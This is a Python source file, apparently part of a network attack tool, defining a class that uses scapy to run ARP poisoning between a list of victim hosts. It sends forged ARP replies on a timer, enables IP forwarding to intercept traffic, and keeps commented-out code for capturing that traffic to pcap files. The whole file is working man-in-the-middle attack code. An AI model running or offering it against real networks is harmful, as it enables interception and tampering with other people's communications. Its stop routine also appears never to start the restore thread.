import threading
import time

from tkinter import messagebox
from scapy.all import *
from scapy.layers.l2 import ARP


class ArpPois:
    def __init__(self):
        self.victims_ip = None
        self.victims_mac = None
        self.target_ip = None
        self.target_mac = None
        self.stop = False
        self.thread = None
        self.stop_thread = None
        self.sleep_time = 5
        # self.save_traffic = False

    # def set_save(self, save_traffic):
    #     self.save_traffic = save_traffic

    def set_victims(self, victims_ip, victims_mac):
        """
        Set the victims as @victims_ip with respective MACs stored in @victims_mac

        :param victims_ip: victims IP
        :param victims_mac: victims MAC
        :return:
        """
        self.victims_ip = victims_ip
        self.victims_mac = victims_mac

    def set_target(self, target_ip, target_mac):
        """
        Set the target as @target_ip with respective MAC stored in @target_mac

        :param target_ip: target IP
        :param target_mac: target MAC
        :return:
        """
        self.target_ip = target_ip
        self.target_mac = target_mac

    def set_time(self, sleep):
        """
        Set the timer to @sleep seconds. Sends packets every @sleep seconds.

        :param sleep:
        :return:
        """
        self.sleep_time = int(sleep)

    def poison(self, ip2, ip, mac2, mac):
        """
        ARP poisoning between @ip2 and @ip to @target_mac

        :param ip2:
        :param ip:
        :param mac2:
        :param mac:
        :return:
        """
        send(ARP(op=2, pdst=ip2, psrc=ip, hwdst=mac2, hwsrc=self.target_mac))
        send(ARP(op=2, pdst=ip, psrc=ip2, hwdst=mac, hwsrc=self.target_mac))

    @staticmethod
    def restore(ip2, ip, mac2, mac):
        """
        Restores the network for @ip2 and @ip

        :param ip2:
        :param ip:
        :param mac2:
        :param mac:
        :return:
        """
        send(ARP(op=2, pdst=ip, psrc=ip2, hwdst=mac, hwsrc=mac2), count=1)
        send(ARP(op=2, pdst=ip2, psrc=ip, hwdst=mac2, hwsrc=mac), count=1)

    def run(self):
        """
        Starts ARP poisoning between all victims in @self.victims_ip every @self.sleep_time seconds

        :return:
        """
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
                ipf.write('1\n')
        except FileNotFoundError:
            pass
            # messagebox.showerror(
            #     "Error", "Please use a Linux system.")

        # print(self.save_traffic)
        # if self.save_traffic:
        #     packets = sniff()
        #     print(packets)
        #     name = str(datetime.now().time().strftime("%H_%M_%S")) + '_DNS_cache_poisoning.pcap'
        #     wrpcap('../pcap_files/' + name, packets)

        while not self.stop:
            for ip, mac in zip(self.victims_ip, self.victims_mac):
                for ip2, mac2 in zip(self.victims_ip, self.victims_mac):
                    if ip != ip2:
                        self.poison(ip2, ip, mac2, mac)
            time.sleep(self.sleep_time)

    def start_poisoning(self):
        """
        Starts ARP poisoning in a new thread

        :return:
        """
        self.stop = False
        self.thread = threading.Thread(target=self.run)
        self.thread.start()

    def stop_poisoning(self):
        """
        Stops ARP poisoning

        :return:
        """
        self.stop = True

        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
                ipf.write('0\n')
        except FileNotFoundError:
            pass

        self.stop_thread = threading.Thread(target=self.restore_network)

    def restore_network(self):
        """
        Restores the network for all victims in @self.victims_ip

        :return:
        """
        for ip, mac in zip(self.victims_ip, self.victims_mac):
            for ip2, mac2 in zip(self.victims_ip, self.victims_mac):
                if ip != ip2:
                    self.restore(ip2, ip, mac2, mac)
